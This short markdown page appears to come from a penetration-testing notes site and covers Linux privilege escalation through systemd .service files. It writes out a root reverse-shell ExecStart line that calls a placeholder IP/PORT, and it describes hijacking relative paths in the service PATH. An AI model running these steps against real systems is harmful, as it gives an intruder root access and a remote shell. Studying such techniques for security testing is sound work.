---
title: .service File
parent: Method (Linux)
layout: default
nav_order: 10
---

.service file are executed as root, but you need to be able to restart the service or reboot the PC

## .service file writable
1. You can modify the .service file to execute your file, or to initiate reverse shell, for example changing the following (can also remove WorkingDirectory line):
   `ExecStart=bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`
   `User=root`
2. Restart the service or the PC (check `sudo -l` to see if you can `sudo /sbin/reboot`)

## Relative PATH:
1. Check the system PATH using `systemctl show-environment`, need to make sure you have write access to any one of them.
2. Check the service configuration for any relative path, for example:
   `ExecStart=faraday-server`
   `ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'`
3. You can then create a same name executable in the PATH you can write. (previous example, faraday-server)
4. Restart the service or the PC. (check `sudo -l` to see if you can `sudo /sbin/reboot`)